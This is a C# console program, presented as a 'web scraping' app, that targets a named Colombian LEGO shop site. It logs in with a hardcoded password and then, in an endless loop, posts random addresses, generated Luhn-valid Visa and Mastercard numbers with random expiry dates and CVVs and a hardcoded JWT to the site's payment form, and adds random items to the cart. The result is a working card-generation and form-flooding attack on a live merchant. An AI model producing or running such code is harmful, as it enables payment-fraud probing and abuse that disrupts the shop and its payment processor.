using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Configuration;

namespace WebScrapingAppWithHttpClientFactory
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // Build the configuration to load appsettings.json
            IConfiguration config = new ConfigurationBuilder()
                .SetBasePath(Directory.GetCurrentDirectory())
                .AddJsonFile("appsettings.json", optional: false, reloadOnChange: true)
                .Build();

            // Get the username from appsettings.json
            string username = config["UserSettings:Username"];

            var services = new ServiceCollection();
            ConfigureServices(services);

            var serviceProvider = services.BuildServiceProvider();
            var webScrapingService = serviceProvider.GetRequiredService<IWebScrapingService>();

            var token = await webScrapingService.GetSecurityTokenAsync();
            if (!string.IsNullOrEmpty(token))
            {
                Console.WriteLine("Security Token: " + token);

                var loginSuccess = await webScrapingService.LoginAsync(token, username);
                Console.WriteLine(loginSuccess ? "Login Successful!" : "Login Failed.");

                if (loginSuccess)
                {
                    var index = 0;
                    while (true)
                    {
                        var addAddressSuccess = await webScrapingService.AddAddressAsync(token);
                        Console.WriteLine(addAddressSuccess ? "Address added successfully!" : "Failed to add address.");

                        var ccSuccess = await webScrapingService.AddCreditCardAsync(token);
                        Console.WriteLine(ccSuccess ? "Credit card added successfully." : "Failed to add credit card.");

                        var addShopCart = await webScrapingService.AddShopCartAsync(token);
                        Console.WriteLine(addShopCart ? "Product added to shopping cart successfully." : "Failed to add product to the shopping cart.");

                    }
                }
            }
        }

        private static void ConfigureServices(ServiceCollection services)
        {
            // Register HttpClient with HttpClientFactory
            services.AddHttpClient<IWebScrapingService, WebScrapingService>(client =>
            {
                client.DefaultRequestHeaders.Add("Accept", "text/html");
            });

            // Register services
            services.AddScoped<IWebScrapingService, WebScrapingService>();
        }
    }

    public interface IWebScrapingService
    {
        Task<string> GetSecurityTokenAsync();
        Task<bool> LoginAsync(string securityToken, string username);
        Task<bool> AddAddressAsync(string securityToken);
        Task<bool> AddCreditCardAsync(string securityToken);
        Task<bool> AddShopCartAsync(string securityToken);
    }

    public class WebScrapingService : IWebScrapingService
    {
        private readonly HttpClient _httpClient;
        private readonly string allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ";
        private bool IsVisa = false;

        public WebScrapingService(HttpClient httpClient)
        {
            _httpClient = httpClient;
        }

        public async Task<string> GetSecurityTokenAsync()
        {
            // Use absolute URI for the request to get security token
            var response = await _httpClient.GetAsync("https://www.legocolombia.com.co/index.php?main_page=login&action=process");
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                var tokenMatch = Regex.Match(content, @"<input\s+type=[""']hidden[""']\s+name=[""']securityToken[""']\s+value=[""']([^""']+)[""']");

                return tokenMatch.Success ? tokenMatch.Groups[1].Value : null;
            }
            return null;
        }

        public async Task<bool> LoginAsync(string securityToken, string username)
        {
            var formData = new MultipartFormDataContent
            {
                { new StringContent(username), "email_address" },
                { new StringContent("Aa12345"), "password" },
                { new StringContent(securityToken), "securityToken" }
            };

            // Use absolute URI for login
            var response = await _httpClient.PostAsync("https://www.legocolombia.com.co/index.php?main_page=login&action=process", formData);
            return response.IsSuccessStatusCode;
        }

        public async Task<bool> AddAddressAsync(string securityToken)
        {
            var formData = new MultipartFormDataContent
            {
                { new StringContent(GenerateRandomString(13, allowedChars)), "firstname" },
                { new StringContent(GenerateRandomString(13, allowedChars)), "lastname" },
                { new StringContent(GenerateRandomString(128, allowedChars)), "street_address" },
                { new StringContent(GenerateRandomString(21, allowedChars)), "city" },
                { new StringContent(GenerateRandomString(5, "0123456789")), "postcode" },
                { new StringContent(GetRandomNumberAsString()), "zone_country_id" },
                { new StringContent(GenerateRandomString(2, "onON")), "primary" },
                { new StringContent("process"), "action" },
                { new StringContent(securityToken), "securityToken" }
            };

            // Use absolute URI for adding address
            var response = await _httpClient.PostAsync("https://www.legocolombia.com.co/index.php?main_page=address_book_process", formData);
            return response.IsSuccessStatusCode;
        }
        public async Task<bool> AddCreditCardAsync(string securityToken)
        {

            // Setup the form data to simulate the AddCC request
            var formData = new MultipartFormDataContent
            {
                { new StringContent(IsVisa?"Visa":"Mastercard"), "sankee_cc_type" },
                { new StringContent(IsVisa ? GenerateCreditCard("4", 16) : GenerateCreditCard(new[] { "51", "52", "53", "54", "55" }, 16)), "sankee_cc_number" },
                { new StringContent(GenerateRandomString(1, "123456789")), "sankee_cc_expires_month" },
                { new StringContent($"202{GenerateRandomString(1, "56789")}"), "sankee_cc_expires_year" },
                { new StringContent(GenerateRandomString(1, "0123456789")), "sankee_cc_cvv" },
                { new StringContent(GenerateRandomString(1, allowedChars)), "comments" },
                { new StringContent("20230627"), "api_version" },
                { new StringContent("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYW5rZWUiLCJpYXQiOjE3MjY1NzY5NDQsImV4cCI6MTcyNjU3Njk3NCwibmJmIjoxNzI2NTc2OTQ0LCJzdWIiOiJodHRwczpcL1wvcGF5bWVudC5zdXA1LmNvbSIsImp0aSI6ImVkOWUyNGFhNzE1NjY2ZTE2NWI1ZmU2MjVlZDFjNjcyIn0=.PaPWE9BtM6LZwVbNxyorJ/5O0GSekqpadHPfdbGUeVk="), "jwt_token" },
                { new StringContent(securityToken), "securityToken" }
            };

            // Perform the POST request to add the credit card
            var url = "https://www.legocolombia.com.co/index.php?main_page=fec_confirmation&fecaction=process";
            HttpResponseMessage response = await _httpClient.PostAsync(url, formData);

            IsVisa = !IsVisa;
            return response.IsSuccessStatusCode;
        }

        public async Task<bool> AddShopCartAsync(string securityToken)
        {
            // Setup the form data to simulate the AddShopCart request
            var formData = new MultipartFormDataContent
            {
                { new StringContent(GenerateRandomString(3, "0123456789")), "products_id" },
                { new StringContent(securityToken), "securityToken" },
                { new StringContent(GenerateRandomString(5, "123456789")), "cart_quantity" }
            };

            // Perform the POST request to add the product to the shopping cart
            var url = "https://www.legocolombia.com.co/products/otros-lego-girasoles-edades-8-40524-artículo-191-piezas-ife102568-p-456.html?action=add_product";
            HttpResponseMessage response = await _httpClient.PostAsync(url, formData);
            return response.IsSuccessStatusCode;
        }

        private string GenerateRandomString(int length, string allowedChars)
        {
            Random random = new Random();
            return new string(Enumerable.Repeat(allowedChars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        private string GetRandomNumberAsString()
        {
            Random random = new Random();
            int randomNumber = random.Next(1, 101);
            return randomNumber.ToString();
        }
        private bool IsCreditCardValid(string cardNumber)
        {
            // Remove any non-digit characters (e.g., spaces)
            cardNumber = new string(cardNumber.Where(char.IsDigit).ToArray());

            // Reverse the digits
            var reversedDigits = cardNumber.Reverse().Select(c => c - '0').ToArray();

            int sum = 0;

            for (int i = 0; i < reversedDigits.Length; i++)
            {
                int digit = reversedDigits[i];

                // Double every second digit (starting from the second)
                if (i % 2 == 1)
                {
                    digit *= 2;

                    // If doubling results in a number greater than 9, subtract 9
                    if (digit > 9)
                    {
                        digit -= 9;
                    }
                }

                // Add the digit to the sum
                sum += digit;
            }

            // If the total modulo 10 is 0, the number is valid
            return sum % 10 == 0;
        }



        private string GenerateCreditCard(string prefix, int length)
        {
            Random random = new Random();

            // Start with the prefix
            string cardNumber = prefix;

            // Generate random digits for the rest of the card, excluding the last digit (which is the Luhn checksum)
            while (cardNumber.Length < length - 1)
            {
                cardNumber += random.Next(0, 10).ToString();
            }

            // Calculate Luhn checksum digit and append it
            cardNumber += CalculateLuhnCheckDigit(cardNumber);

            return cardNumber;
        }

        private string GenerateCreditCard(string[] prefixes, int length)
        {
            Random random = new Random();
            string prefix = prefixes[random.Next(0, prefixes.Length)]; // Randomly select one of the prefixes
            return GenerateCreditCard(prefix, length);
        }

        private int CalculateLuhnCheckDigit(string cardNumber)
        {
            int sum = 0;
            bool doubleDigit = false;

            // Process digits starting from the right (reverse order)
            for (int i = cardNumber.Length - 1; i >= 0; i--)
            {
                int digit = int.Parse(cardNumber[i].ToString());

                if (doubleDigit)
                {
                    digit *= 2;
                    if (digit > 9)
                    {
                        digit -= 9;
                    }
                }

                sum += digit;
                doubleDigit = !doubleDigit;
            }

            int mod10 = sum % 10;
            return (mod10 == 0) ? 0 : 10 - mod10;
        }
    }
}
